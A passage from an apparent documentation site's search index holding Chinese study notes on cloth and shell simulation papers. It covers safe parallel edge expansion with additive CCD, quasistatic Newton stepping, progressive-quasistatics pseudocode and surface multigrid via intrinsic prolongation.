prolonged geometry targets\u3002</p> <p>\u5728\u4e0b\u4e00\u8282\u6211\u4eec\u5c06\u8bb2\u8ff0\u6700\u7ec8\u7684\u5e76\u884c\u6269\u5f20\u7b97\u6cd5\uff0c\u672c\u8282\u5148\u8bb2\u8ff0\u5b83\u4eec\u7684 sequential \u505a\u6cd5</p> <p>\u6211\u4eec\u5e94\u6ce8\u610f\u5230\uff0c\u5728\u8fdb\u884c refinement \u64cd\u4f5c\u524d\uff0c\u4e0a\u4e00\u5c42\u901a\u8fc7 IPC \u5f97\u5230\u7684\u65b9\u6cd5\u53ef\u4ee5\u786e\u4fdd\u8868\u9762\u4e24\u4e24\u4e4b\u95f4\u5b58\u5728\u4e00\u5b9a gap distance\uff0c\u6211\u4eec\u8ba1\u7b97\u5f97\u5230 minimal-gap \\(g\\)\uff0c\u5b83\u7684\u8303\u56f4\u901a\u5e38\u662f 1e-3 ~ 1e-4\u3002</p> <p>\u968f\u540e\u6211\u4eec\u5c06\u6bcf\u4e2a\u65b0\u63d2\u5165\u7684\u9876\u70b9\u6cbf\u7740\u5b83\u4eec\u7684 safe perturbation direction \u79fb\u52a8\u4e00\u5c0f\u6bb5\u8ddd\u79bb\uff0c\u8fd9\u4e2a\u8ddd\u79bb\u8981\u8fdc\u5c0f\u4e8e \\(g\\)\u3002\u8fd9\u80fd\u591f\u786e\u4fdd\u5168\u5c40\u975e\u76f8\u4ea4\u5b89\u5168\u6027\uff0c\u800c\u65e0\u9700\u8fdb\u884c\u6602\u8d35\u7684\u5168\u5c40\u76f8\u4ea4\u68c0\u6d4b\u548c\u5904\u7406\u3002</p> <p>Safe Perturbation Direction\uff1a\u5373\u4e0a\u4e00\u6b65\u4e2d\u7684\u6270\u52a8\u65b9\u5411</p> <ul> <li>\u5728\u6b63\u5f0f CCD \u524d\uff0c\u4f1a\u7528\u666e\u901a\u7684\u7a7a\u95f4\u54c8\u5e0c + CCD \u7c97\u7565\u9636\u6bb5\uff08broad-phase\uff09\u6765\u63d0\u524d\u7b5b\u9664\u76f8\u8ddd\u5f88\u8fdc\u7684\u5143\u7d20\u5bf9\u3002</li> <li>Additive-CCD \u63a5\u53d7\u4e00\u4e2a\u53c2\u6570 \\(r\\)\uff0c\u7528\u6765\u63a7\u5236\u201c\u5141\u8bb8\u9760\u8fd1\u7a0b\u5ea6\u201d\u3002\u5bf9\u4e8e\u7559\u4e0b\u7684\u4e0d\u540c\u8ddd\u79bb\u78b0\u649e\u5019\u9009\u5bf9\uff0c\u6211\u4eec\u4e3a\u5176\u91c7\u53d6\u4e0d\u540c\u7b56\u7565\uff1a<ul> <li>\u521d\u59cb\u8ddd\u79bb \\(d_0\\)\uff0c\u65b0\u5f97\u5230\u7684\u8ddd\u79bb \\(d_1\\)\uff0cACCD \u4fdd\u8bc1 \\(d_1 \\ge rd_0\\)\uff0c\u5373 \\(r\\) \u8d8a\u63a5\u8fd1\u4e8e 1 \u5219\u5bf9\u6b65\u957f\u9650\u5236\u5f97\u66f4\u591a</li> </ul> </li> </ul> \u521d\u59cb\u8ddd\u79bb \\(d_0\\) \u5bf9\u5e94 r \u503c\u200b \u539f\u56e0 \\(d_0 \\ll g\\) r = 0.999 \u4e0d\u5e0c\u671b\u518d\u8ba9\u8fd9\u5bf9\u9760\u5f97\u66f4\u8fd1\uff0c\u6b65\u957f\u8981\u975e\u5e38\u5c0f \\(d_0 \\approx g\\) \u6216 \\(d_0 \\gg g\\) r = 0.1 \u53ef\u4ee5\u5141\u8bb8\u5927\u6b65\u4e00\u70b9\uff0c\u63a8\u8fdb\u901f\u5ea6\u66f4\u5feb <ul> <li>\u8fd9\u79cd\u7b56\u7565\u5728\u4e0d\u540c\u7c7b\u578b\u7684\u9876\u70b9\u5bf9\u4e0a\u505a trade-off\uff1a\u9632\u6b62\u76f8\u4ea4 vs \u4fdd\u6301\u901f\u5ea6\u3002</li> </ul> <p>\u6839\u636e ACCD \u79fb\u52a8\u8fc7\u540e\uff0c\u6211\u4eec\u8fd8\u9700\u68c0\u67e5\u6bcf\u5bf9\u78b0\u649e\u5019\u9009\u7684\u4e4b\u95f4\u7684\u6700\u7ec8\u8ddd\u79bb \\(d_1\\)\uff0c\u5982\u679c \\(d_1 \\lt g\\)\uff0c\u6216\u8005\u51fa\u73b0\u4e86\u7f51\u683c\u9000\u5316\u7b49\u4e0d\u5408\u7406\u60c5\u51b5\uff0c\u6211\u4eec\u4f1a\u5728\u5c40\u90e8 patch \u533a\u57df\u5185\u589e\u5927 contact stiffness \u8fdb\u884c\u591a\u6b21\u725b\u987f\u8fed\u4ee3\uff0c\u4ece\u800c\u6062\u590d\u8fc7\u8fd1\u78b0\u649e\u5bf9\u4e4b\u95f4\u7684\u95f4\u9699\u3002</p> <p>\u8fd9\u79cd\u6309\u5757\u4f18\u5316\u7684\u8fd0\u7b97\u662f\u4e00\u79cd\u5fae\u5c0f\u4e14\u5c40\u90e8\u7684\u5f00\u9500\uff0c\u7531\u4e8e\u6211\u4eec ACCD \\(r\\) \u7684\u8bbe\u7f6e\uff0c\u5b83\u5728\u5927\u591a\u6570\u4f8b\u5b50\u4e2d\u4e0d\u4f1a\u8fdb\u884c</p>"},{"location":"Accumulation/paper/speedup_2/#safe-parallel-expansion","title":"Safe Parallel Expansion","text":"<p>\u5b9e\u9645\u5c42\u7ea7\u6784\u5efa\u4e2d\uff0c\u9700\u8981\u4e00\u6b21\u5c55\u5f00\u6210\u5343\u4e0a\u4e07\u6761\u8fb9\uff0c\u5982\u679c\u9010\u6761\u987a\u5e8f\u5904\u7406\uff0c\u4e0d\u4ec5\u8fd0\u884c\u7f13\u6162\uff0c\u8fd8\u53ef\u80fd\u4ea7\u751f\u6b21\u5e8f\u4f9d\u8d56\u3002Safe Parallel Expansion \u7684\u6838\u5fc3\u601d\u60f3\u662f\uff1a</p> <ul> <li>\u5c40\u90e8\u72ec\u7acb\u6027 (locality assumption)<ul> <li>\u591a\u4e2a expansion \u64cd\u4f5c\u5982\u679c\u5bf9\u5e94\u7684 patch \u4e0d\u91cd\u53e0\uff0c\u5b83\u4eec\u5c31\u53ef\u4ee5\u5728\u51e0\u4f55\u4e0a\u5e76\u884c\u5c55\u5f00\u3002</li> <li>\u4e5f\u5c31\u662f\u8bf4\uff0c\u53ea\u8981\u786e\u4fdd\u4e0d\u540c expansion \u7684 affected triangles \u4e0d\u76f8\u4ea4\uff0c\u5c31\u53ef\u4ee5\u540c\u65f6\u505a\u3002</li> </ul> </li> <li>\u6279\u5904\u7406\u8c03\u5ea6 (batch scheduling)<ul> <li>\u628a\u6240\u6709 expansion \u5206\u6210\u82e5\u5e72\u7ec4\uff08batch\uff09\u3002<ul> <li>\u901a\u8fc7 coloring \u8fdb\u884c\u5904\u7406</li> </ul> </li> <li>\u6bcf\u4e00\u7ec4\u91cc\u7684 expansion \u4e92\u4e0d\u5e72\u6270\uff0c\u53ef\u4ee5\u5e76\u884c\u5c55\u5f00\u3002</li> <li>\u7ec4\u4e0e\u7ec4\u4e4b\u95f4\u4e32\u884c\uff0c\u4fdd\u8bc1\u5b89\u5168\u6027\u3002</li> </ul> </li> <li>\u6bcf\u7ec4\u5185\u90e8\u7684 Safe Expansion<ul> <li>\u5728 batch \u5185\uff0c\u6bcf\u4e2a expansion \u7528\u5355\u8fb9\u7684 safe initialization \u7b97\u6cd5\uff08randomized stratified sampling + CCD filter\uff09\u4fdd\u8bc1\u5408\u6cd5\u6027\uff1b</li> <li>\u56e0\u4e3a\u5b83\u4eec patch \u4e0d\u91cd\u53e0\uff0c\u6240\u4ee5 CCD \u68c0\u6d4b\u53ea\u9700\u8981\u8003\u8651\u5c40\u90e8\uff0c\u4e0d\u9700\u8981\u5168\u5c40\u3002</li> </ul> </li> </ul> <p>\u7b97\u6cd5\u6b65\u9aa4\uff1a</p> <p>1. \u6279\u5904\u7406\u5206\u7ec4 \u2014\u2014 Graph Coloring</p> <ul> <li>\u72ec\u7acb\u6027\u7ea6\u675f\uff1a\u540c\u4e00 batch \u5185\uff0c\u4e24\u4e2a expansion \u7684\u9876\u70b9\u4e0d\u80fd\u662f\u62d3\u6251\u90bb\u5c45\u3002<ul> <li>\u8fd9\u6837\u907f\u514d nested expansion\u3002</li> </ul> </li> <li>\u5982\u4f55\u5206\u7ec4\uff1f<ul> <li>\u6839\u636e decimation \u7684\u4f9d\u8d56\u5173\u7cfb\u5efa\u56fe\uff08dependency graph\uff09\uff1b</li> <li>\u5bf9\u8fd9\u4e2a\u56fe\u505a greedy coloring\uff0c\u5f97\u5230\u82e5\u5e72\u7ec4\uff1b</li> <li>\u6bcf\u7ec4 expansion \u5c31\u80fd\u5b89\u5168\u5e76\u884c\u3002</li> </ul> </li> <li>\u4f18\u52bf\uff1a\u8fd9\u4e2a coloring \u5728 decimation \u540e\u53ef\u4ee5\u9884\u5904\u7406\u4e00\u6b21\uff0c\u540e\u7eed progressive simulation \u90fd\u80fd\u590d\u7528\u3002</li> </ul> <p>2. \u5355\u6279\u6b21\u5185\u90e8\u7684\u5e76\u884c Expansion \u6d41\u7a0b</p> <p>\u8fdb\u5165\u4e00\u4e2a batch \u4e4b\u540e\uff0c\u6b65\u9aa4\u5982\u4e0b\uff1a</p> <p>(a) Safe perturbation initialization</p> <ul> <li>\u5bf9 batch \u5185\u7684\u6240\u6709 expanding vertices \u5e76\u884c\u5e94\u7528\u968f\u673a\u91c7\u6837\u7684 safe perturbation\uff08\u548c\u524d\u6587\u91cc single safe expansion \u4e00\u81f4\uff09\u3002</li> </ul> <p>(b) ACCD additive advancement</p> <ol> <li>\u6bcf\u4e2a expanding vertex \\(x_i\\)\u200b \u6709\u4e00\u4e2a\u5269\u4f59 displacement\uff1a     $\\(\\delta_i = x_i^{\\text{target}} - x_i^{\\text{init}}\\)$</li> <li>\u6267\u884c ACCD \u5faa\u73af\uff1a<ul> <li>\u78b0\u649e\u88c1\u526a\uff1a\u5bf9 candidate pairs \u505a broad-phase culling\uff0c\u5f97\u5230\u53ef\u80fd\u63a5\u89e6\u7684\u5bf9\u3002</li> <li>ACCD \u67e5\u8be2\uff1a\u4e3a\u6bcf\u5bf9\u5019\u9009\u5bf9\u8ba1\u7b97\u5b89\u5168\u6b65\u957f\u4e0a\u754c \\(\\alpha\\)\u3002</li> <li>\u53d6\u6700\u5c0f\u503c\uff1a\u5168\u5c40\u5b89\u5168\u6b65\u957f = \u6240\u6709\u5bf9\u4e2d\u6700\u5c0f \\(\\alpha\\)\u3002</li> <li>\u63a8\u8fdb\u6240\u6709\u9876\u70b9\uff1a     $\\(x_i \\leftarrow x_i + \\alpha \\delta_i\\)$</li> <li>\u51bb\u7ed3\u78b0\u649e\u9876\u70b9\uff1a\u5982\u679c\u67d0\u4e9b\u9876\u70b9 \\(j\\) \u51fa\u73b0\u5728\u89e6\u53d1 \\(\\alpha\\) \u7684 pair stencil\uff0c\u5219\u5b83\u4eec\u7684 displacement \u88ab\u7f6e\u96f6\uff08\u505c\u6b62\uff09\u3002</li> <li>\u66f4\u65b0\u5176\u4f59\u9876\u70b9\uff1a     $\\(\\delta_k \\leftarrow (1-\\alpha)\\delta_k\\)$</li> <li>\u91cd\u590d\uff0c\u76f4\u5230\u8fd4\u56de \\(\\alpha =1\\)\uff0c\u5373\u6ca1\u6709\u65b0\u7684\u78b0\u649e\u963b\u788d\u3002</li> </ul> </li> <li>\u597d\u5904\uff1a<ul> <li>\u907f\u514d\u201c\u6700\u5c0f \\(\\alpha\\)\u201d\u5361\u6b7b\u6240\u6709\u9876\u70b9\u7684\u8fdb\u5ea6\uff1b</li> <li>\u8ba9\u4e0d\u540c\u9876\u70b9\u80fd \u5206\u9636\u6bb5\u9010\u6b65\u5230\u8fbe target\uff0c\u5e76\u884c\u9ad8\u6548\u3002</li> </ul> </li> </ol> <p>(c) Patch-based relaxation</p> <ul> <li>\u5982\u679c\u6700\u540e\u67d0\u4e9b primitive pair \u7684\u8ddd\u79bb &lt; safe gap \\(g\\)\uff0c\u8bf4\u660e\u5feb\u201c\u8d34\u4e0a\u4e86\u201d\uff1b</li> <li>\u5c31\u5728\u5c40\u90e8 patch \u4e0a\u89e3\u4e00\u4e2a\u5e26 elastic + IPC barrier \u7684\u5c40\u90e8\u4f18\u5316\uff0c\u628a\u95f4\u9699\u6062\u590d\u5230\u5b89\u5168\u8ddd\u79bb\u3002</li> </ul>"},{"location":"Accumulation/paper/speedup_2/#stain-limiting-feasibility","title":"Stain Limiting Feasibility","text":"<p>\u867d\u7136\u7ecf\u8fc7\u4e0a\u8ff0 Edge-Expansion \u5df2\u7ecf\u5f97\u5230\u4e86\u4e00\u4e2a intersection-free \u7684\u76ee\u6807\u7f51\u683c\uff0c\u4f46\u8fd9\u4e2a\u7f51\u683c\u4ecd\u7136\u6709\u53ef\u80fd\u4e0d\u6ee1\u8db3\u6750\u6599\u7684 Strain Limits\u3002</p> <p>\u7279\u522b\u662f\u5728\u5904\u7406\u5177\u6709\u6700\u5927\u4f38\u5c55\u9650\u5236\u7684\u58f3\u4f53\u6750\u6599\u4e2d</p> <p>\u5177\u4f53\u65b9\u6cd5\u76f4\u63a5\u91c7\u7528 PCS \u8bba\u6587\uff0c\u8be5\u8bba\u6587\u4e2d\u6ca1\u6709\u8be6\u7ec6\u8bb2\u89e3\u3002</p>"},{"location":"Accumulation/paper/speedup_2/#quasistatic-stepping","title":"Quasistatic Stepping","text":"<p>\u725b\u987f\u8fed\u4ee3\u4e2d\uff0cprojected Hessian \u77e9\u9635\u7684\u5f62\u5f0f\u5982\u4e0b\uff1a</p> \\[ H(x_l) = \\frac{1}{h^2} M_l + ProjectPSD\\left(\\nabla^2 E(x_l)\\right) \\] <p>\u6bcf\u8f6e\u8fed\u4ee3\u7684\u641c\u7d22\u65b9\u5411 \\(p\\) \u7531\u5982\u4e0b\u7ebf\u6027\u7cfb\u7edf\u6c42\u89e3\u5f97\u5230\uff1a</p> \\[ H(x_l) p = - \\left( \\frac{1}{h^2}M + (U^l) ^T \\nabla \\Psi (U^l x_l + d_l) + \\nabla C(x_l) \\right) \\tag {10}  \\] <p>\u53f3\u4fa7\u662f\u5f53\u524d\u589e\u91cf\u52bf\u80fd\u7684\u68af\u5ea6\u9879\uff08\u5305\u62ec\u53d8\u5f62\u52bf\u80fd \\(\\Psi\\) \u548c\u7ea6\u675f\u9879 \\(C\\)\uff09\uff1a</p> <ul> <li>\\(\\Psi\\)\uff1a\u4e3b\u52bf\u80fd\uff08\u5982\u5f39\u6027\u80fd\uff09</li> <li>\\(C\\)\uff1a\u786c\u7ea6\u675f\uff08\u5982\u4e0d\u53ef\u7a7f\u900f\u6761\u4ef6\uff09</li> <li>\\(U^l\\)\uff1aprolongation \u76f8\u5173\u53d8\u6362\u77e9\u9635 </li> <li>\\(d^l\\)\uff1a\u5f53\u524d\u4f4d\u79fb\u4e0b\u7684\u504f\u79fb</li> </ul> <p>\u8fd9\u4e00\u9636\u6bb5\u5e76\u4e0d\u9700\u8981\u7cbe\u786e\u89e3\uff0c\u6211\u4eec\u53ef\u4ee5\u4e3a\u5176\u8bbe\u7f6e\u6700\u5927\u725b\u987f\u8fed\u4ee3\u6b21\u6570\uff0c\u76ee\u6807\u662f\u5feb\u901f\u6536\u655b + \u7a33\u5b9a\u8fc7\u6e21 + \u4e2d\u95f4\u72b6\u6001\u53ef\u89c6\u5316\u3002\u6700\u540e\u4e00\u5c42\u6211\u4eec\u624d\u9700\u8981\u5b8c\u6574\u8fed\u4ee3\u81f3\u6536\u655b\uff0c\u8981\u6c42\u6700\u540e\u4e00\u6b21\u8fed\u4ee3\u6b65\u957f\u5c0f\u4e8e\u5bb9\u5dee\u3002</p>"},{"location":"Accumulation/paper/speedup_2/#pseudo-code","title":"Pseudo Code","text":"<p>GPT \u603b\u7ed3</p> <pre><code># Algorithm: Progressive Quasistatics (PSQ)\n\nInput:\n    - Mesh hierarchy { M^0, M^1, ..., M^L } from edge-collapse decimation\n    - Time steps T, step size h\n    - External forces f_ext\n    - Collision objects (treated as additional mesh domains)\nOutput:\n    - Sequence of simulated states { x^l_t }\n\n--------------------------------------------------\nPreprocessing:\n1. Build hierarchy via decimation:\n       Record intrinsic UV for collapsed vertices,\n       Record extrinsic offsets (\u03b3_i, t_i) for prolongation.\n2. Precompute graph coloring for expansions:\n       - Build dependency graph of edge collapses.\n       - Apply greedy coloring \u2192 batches { C^1, C^2, ... }.\n3. Initialize collision objects:\n       - Prolongation &amp; coloring same as for shells.\n\n--------------------------------------------------\nMain Simulation Loop:\nfor each timestep t = 0,...,T-1 do\n    # Progressive refinement through levels\n    for l = 0,...,L-1 do\n        # Solve quasistatics at current level\n        x^{l}_{t+1} \u2190 argmin_x {\n            (1/2h^2) || x - x^l_t ||^2_{M^l} + F^l(x)\n        }\n        where\n            F^l(x) = B^l(x) + D^l(x) + S^l(x)   # barrier/contact + strain limit\n                      + \u03a8^l P^l(x)              # prolongated fine-scale shell energy\n\n        # Expand to next finer level\n        SafeParallelExpansion(M^l \u2192 M^{l+1})\n    end for\nend for\n\n--------------------------------------------------\nSubroutine: SafeParallelExpansion(M^l \u2192 M^{l+1})\nfor each batch C in coloring {C^1, C^2, ...} do\n    parallel for each edge expansion e in C do\n        # Step 1: Safe perturbation initialization\n        Apply sampling-based safe initial displacement\n        Ensure local non-intersection\n    end parallel\n\n    # Step 2: ACCD additive advancement\n    For all expanding vertices, define target displacement \u03b4_i\n    repeat\n        - Broad-phase culling on candidate pairs\n        - Compute per-pair CCD ratio bounds \u2192 \u03b1\n        - Advance all vertices: x_i \u2190 x_i + \u03b1 \u03b4_i\n        - Freeze vertices that triggered \u03b1: \u03b4_j \u2190 0\n        - Update remaining displacements: \u03b4_k \u2190 (1-\u03b1) \u03b4_k\n    until \u03b1 = 1\n\n    # Step 3: Patch relaxation\n    If any primitive pair distance &lt; safe gap g:\n        Solve local elastic + IPC barrier relaxation\nend for\n\n--------------------------------------------------\nSubroutine: Prolongation (Shell Prolongation)\nfor each expanded vertex i:\n    anchor = U_{l,l+1} x^l           # intrinsic prolongation\n    offset = n_i(x^l) \u03b3_i + R_i(F_i) t_i\n    x^{l+1}_i = anchor + offset\nend for\n</code></pre>"},{"location":"Accumulation/paper/speedup_3/","title":"Surface Multigrid via Intrinsic Prolongation","text":""},{"location":"Accumulation/paper/speedup_3/#surface-multigrid-via-intrinsic-prolongation","title":"Surface Multigrid via Intrinsic Prolongation","text":"<p> \u7ea6 2520 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 13 \u5206\u949f</p> <p>Surface Multigrid via Intrinsic Prolongation</p> <p>\u4f20\u7edf Linear Solver \u7ecf\u5e38\u6210\u4e3a\u51e0\u4f55\u5904\u7406\u7b97\u6cd5\u7684\u74f6\u9888\u3002\u7279\u522b\u662f\u5728\u6bcf\u6b21\u8fed\u4ee3\u7ebf\u6027\u7cfb\u7edf\u90fd\u4f1a\u6539\u53d8\u7684\u573a\u666f\u4e2d\uff0cdirect solvers \u90fd\u9700\u8981\u6602\u8d35\u7684 re-factorization\u3002\u5bf9\u4e8e\u7ed3\u6784\u5316\u573a\u666f\u4e0a\u7684\u95ee\u9898\uff0c\u53ef\u4ee5\u4f7f\u7528 geometric multigrid \u65b9\u6cd5\uff0c\u5b83\u7684\u6c42\u89e3\u5668\u53ea\u6839\u636e\u7f51\u683c\u51e0\u4f55\u8fdb\u884c\u9884\u5904\u7406\uff0c\u800c\u4e0d\u5173\u5fc3\u7ebf\u6027\u7cfb\u7edf\u7684\u6539\u53d8\uff0c\u4ece\u800c\u4fdd\u8bc1\u4e86\u7ebf\u6027\u5904\u7406\u65f6\u95f4\u3002</p> <p>\u672c\u8bba\u6587\u63d0\u51fa\u4e86\u4e3a\u6d41\u5f62\u7f51\u683c\u8bbe\u8ba1\u7684 Galerkin Geometric Multigrid Solver\uff0c\u4f7f\u7528\u6211\u4eec\u7684\u6c42\u89e3\u5668\u4ee3\u66ff direct solver \u53ef\u4ee5\u5e26\u6765\u6570\u91cf\u7ea7\u4e0a\u7684\u63d0\u5347\uff0c\u4ece\u800c\u5c06\u8fd0\u7b97\u74f6\u9888\u4ece Linear Solver \u4e0a\u79fb\u5f00\u3002</p>"},{"location":"Accumulation/paper/speedup_3/#multigrid-overview","title":"Multigrid Overview","text":"<p>Multigrid \u662f\u4e00\u79cd\u53ef\u62d3\u5c55\u7684 Iterative Solver\uff0c\u7528\u6765\u6c42\u89e3\u5927\u578b\u7ebf\u6027\u7cfb\u7edf \\(Ax=b\\)\u3002\u5176\u6838\u5fc3\u7684\u64cd\u4f5c\u6709\u4e24\u4e2a\uff1arelaxation \u548c coarse-grid correction\u3002</p> <ul> <li>Relaxation \u6d89\u53ca\u5c06\u7ecf\u5178\u8fed\u4ee3\u65b9\u6cd5\u5e94\u7528\u5230\u6821\u6b63\u5f53\u524d\u89e3\u548c\u7cfb\u7edf\u7cbe\u786e\u89e3\u4e4b\u95f4\u7684\u9ad8\u9891\u8bef\u5dee</li> <li>Coarse-grid correction \u4f7f\u7528\u9650\u5236\u5c06\u4f4e\u9891\u8bef\u5dee\u4f20\u9012\u5230\u66f4\u7c97\u7cd9\u7684\u7f51\u683c\uff0c\u5728\u7c97\u7f51\u683c\u7cfb\u7edf\u4e0a\u6c42\u89e3\u7cfb\u7edf\uff0c\u7136\u540e\u901a\u8fc7 prolongation \u5c06\u4fee\u6b63\u4f20\u9012\u56de\u7ec6\u7f51\u683c</li> </ul> <p>\u56e0\u6b64\u5982\u4f55\u5efa\u7acb Multigrid Hierarchy \u4ee5\u53ca\u5982\u4f55\u5728\u7f51\u683c\u5c42\u7ea7\u4e4b\u95f4\u4f20\u9012\u4fe1\u606f\u662f\u8be5\u6c42\u89e3\u5668\u6548\u7387\u7684\u5173\u952e</p> <p>\u6211\u4eec\u7684 geometric multigrid \u57fa\u4e8e Garlerkin coarse grid approximation\uff0c\u5b83\u5728\u6bcf\u4e2a\u7c97\u7f51\u683c\u5c42\u6b21\u4e0a\u5efa\u7acb\u7ebf\u6027\u7cfb\u7edf\uff1a</p> \\[ A_{\\text{coarse}}= RA_{\\text{fine}}P \\] <p>\u5176\u4e2d \\(A_{\\text{fine}}\\) \u548c \\(A_{\\text{coarse}}\\) \u5206\u522b\u662f\u7ec6\u7f51\u683c\u548c\u5bf9\u5e94\u7c97\u7f51\u683c\u4e0a\u7684\u7cfb\u7edf\u77e9\u9635\uff0c\\(P\\) \u662f\u4ece\u7c97\u7f51\u683c\u5230\u7ec6\u7f51\u683c\u7684\u5ef6\u62d3\u7b97\u5b50\uff0c\\(R\\) \u662f\u5bf9\u5e94\u7684\u9650\u5236\u7b97\u5b50\uff08\u5f53 \\(A_{\\text{fine}}\\) \u4e3a\u5bf9\u79f0\u77e9\u9635\u65f6\uff0c\u901a\u5e38\u53d6\u4e3a \\(R=P^T\\)\uff09\u3002</p> <p>\u5ef6\u62d3\u7b97\u5b50 \\(P\\) \u662f\u591a\u91cd\u7f51\u683c\u6027\u80fd\u7684\u5173\u952e\uff0c\u5b83\u65e2\u8981\u5728\u7ec6\u7f51\u683c\u4e0a\u51c6\u786e\u63d2\u503c\u4f4e\u9891\u89e3\uff0c\u53c8\u8981\u4fdd\u6301\u7a00\u758f\u4ee5\u63d0\u9ad8\u6548\u7387</p>"},{"location":"Accumulation/paper/speedup_3/#intrinsic-prolongation","title":"Intrinsic Prolongation","text":"<p>\u6211\u4eec\u901a\u8fc7\u4fdd\u6301 intrinsic parameterization \u6765\u8ba1\u7b97 prolongation\u3002</p> <p>\u7c97\u7ec6\u7f51\u683c\u4e4b\u95f4\u7684\u6620\u5c04\u65f6 bijective \u7684\u3002\u7ed9\u5b9a\u7ec6\u7f51\u683c\u4e0a\u4e00\u4e2a\u70b9\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u5b83\u5728\u7c97\u7f51\u683c\u4e0a\u76f8\u5e94\u7684 barycentric coordinates\uff0c\u53cd\u8fc7\u6765\u4e5f\u662f\u5982\u6b64\u3002</p>"},{"location":"Accumulation/paper/speedup_3/#successive-self-parameterization","title":"Successive Self-Parameterization","text":"<p>\u672c\u8bba\u6587\u4e2d\uff0c\\(\\mathcal M^0\\) \u8868\u793a finest mesh\uff0c\\(\\mathcal M^L\\) \u8868\u793a coarsest mesh\uff0c\\(f_{l+1}^l: \\mathcal M^l \\rightarrow \\mathcal M^{l+1}\\) \u8868\u793a\u4e24\u5c42\u4e4b\u95f4\u7684 bijective map\u3002\u90a3\u4e48 final map \u53ef\u4ee5\u8868\u793a\u4e3a\uff1a</p> \\[\\begin{array}l f_L^0: \\mathcal M^0 \\rightarrow \\mathcal M^L \\\\ f_L^0= f_L^{L-1}\\circ \\dots \\circ f_1^0 \\end{array} \\tag 2 \\] <p>\u5bf9\u4e8e\u6bcf\u4e00\u6b21 edge collapse\uff0c\u9664\u4e86 collapsed edge \u90bb\u8fb9\uff0c\u5927\u90e8\u5206\u4e09\u89d2\u5f62\u90fd\u4fdd\u6301\u4e0d\u53d8\u3002\\(\\mathcal N^l(k)\\) \u8868\u793a level \\(l\\) \u4e0a\u9876\u70b9 \\(k\\) \u7684\u76f8\u90bb\u70b9\uff08\u5305\u62ec \\(k\\) \u81ea\u5df1\uff09\uff0c\u76f8\u5e94\u7684\uff0c\u4f7f\u7528 \\(\\mathcal N^l(i,j)= \\mathcal N^l(i) \\cup \\mathcal N^l(j)\\) \u8868\u793a edge \\(i,j\\) \u7684\u76f8\u90bb\u70b9\u3002</p> <p>\\(\\mathcal N^l(k)\\) \u79f0\u4e3a 1-ring \u90bb\u57df\uff0c\u5f62\u6210\u4e00\u4e2a\u5c40\u90e8 patch</p> <p>\u5047\u5b9a \\(l\\) \u5c42\u7684 edge \\(i,j\\) \u6298\u53e0\u6210 \\(l+1\\) \u5c42\u7684 vertex \\(k\\)\uff0c\u90a3\u4e48\u6709\u4e00\u4e2a\u5173\u952e\u89c2\u5bdf\u4e3a \\(\\mathcal N^l(i,j )= \\mathcal N^{l+1} (k)\\)</p>"},{"location":"Accumulation/paper/speedup_3/#joint-flattening","title":"Joint Flattening","text":"<p>\u5982\u679c\u6211\u4eec\u53ea\u662f\u968f\u673a\u9009\u53d6\u4e00\u4e2a coarse \u4e09\u89d2\u5f62\u4f5c\u4e3a fine \u9876\u70b9\u7684\u91cd\u5fc3\u5750\u6807\u57fa\u51c6\uff0c\u9009\u53d6\u8fc7\u7a0b\u4f1a\u53d8\u6210\u968f\u673a/\u542f\u53d1\u5f0f\uff0c\u7f3a\u4e4f\u4e00\u81f4\u6027\uff0c\u5bfc\u81f4\u8bef\u5dee\u79ef\u7d2f\u4e25\u91cd\u3002</p> <p>\u56e0\u6b64\u6211\u4eec\u76f4\u63a5 flatten \u6574\u4e2a\u5c40\u90e8 patch\uff0c\u5728\u8fb9\u6298\u53e0\u524d\u540e\uff0c\u8fd9\u4e2a patch \u7684\u95ed\u5408\u66f2\u7ebf\u5b8c\u5168\u4e00\u81f4\uff0c\u5373\u53ef\u4ee5\u5728 UV \u57df\u4e0a\u5bf9\u9f50\uff0c\u56e0\u6b64\u8fd9\u4e2a\u6620\u5c04\u662f bijective \u7684\u3002</p> <p>\u63a5\u4e0b\u6765\u7684\u5185\u5bb9\u7531 GPT \u603b\u7ed3\u751f\u6210\uff0c\u56e0\u4e3a\u6211\u81ea\u5df1\u7684\u5b9e\u73b0\u6ca1\u6709\u5c55\u5e73\u6574\u4e2a patch\uff0c\u56e0\u6b64\u4ee5\u540e\u518d\u6765\u770b\u5982\u4f55\u5b9e\u73b0\u7684</p> <p>\u7b2c\u4e00\u6b65\uff1a\u6784\u9020\u8054\u5408\u4f18\u5316\u95ee\u9898\uff08\u5171\u4eab\u8fb9\u754c\u7684\u53cc\u8865\u4e01\u5c55\u5e73\uff09</p> <p>\u53d8\u91cf\u4e0e\u8865\u4e01\uff1a</p> <ul> <li>\u4ee4 \\(V^l, F^l\\) \u662f\u6298\u53e0\u524d\u8865\u4e01\uff08\u8fb9 \\((i,j)\\) \u7684 1-ring\uff09\u91cc\u7684\u9876\u70b9/\u4e09\u89d2\u5f62\u96c6\u5408\uff1b\\(V^{l+1}, F^{l+1}\\) \u662f\u6298\u53e0\u540e\u8865\u4e01\uff08\u9876\u70b9 kkk \u7684 1-ring\uff09\u3002</li> <li>\u4ee4 \\(\\partial P^l\\) \u4e0e \\(\\partial P^{l+1}\\) \u662f\u4e24\u5757\u8865\u4e01\u7684\u8fb9\u754c\u9876\u70b9\u73af\uff08\u6ce8\u610f\uff1a\u6298\u53e0\u524d\u540e\u8fd9\u4e24\u4e2a\u8fb9\u754c\u73af\u5728 3D \u4e0a\u662f\u540c\u4e00\u5708\u70b9\uff0c\u53ea\u662f\u4e2d\u95f4\u7684\u4e09\u89d2\u5256\u5206\u4e0d\u540c\u2014\u2014\u8fd9\u662f\u5173\u952e\u89c2\u5bdf\uff09\u3002</li> <li>\u6211\u4eec\u4e3a\u4e24\u5757\u8865\u4e01\u5404\u81ea\u5f15\u5165 UV \u53d8\u91cf\uff1a\\(\\mathbf{U}^l\\in\\mathbb{R}^{2|V^l|}\\)\u3002</li> </ul> <p>\u5171\u4eab\u8fb9\u754c\uff1ajoint variable</p> <ul> <li>\u4e3a\u4e86\u5f3a\u5236\u201c\u8fb9\u754c\u4e00\u81f4\u201d\uff0c\u4f5c\u8005\u4e0d\u628a\u5b83\u5f53\u6210\u7ea6\u675f\u53bb\u52a0\u62c9\u683c\u6717\u65e5\u4e58\u5b50\uff0c\u800c\u662f\u76f4\u63a5\u5f15\u5165\u4e00\u7ec4\u201c\u8054\u5408\u8fb9\u754c\u53d8\u91cf\u201d 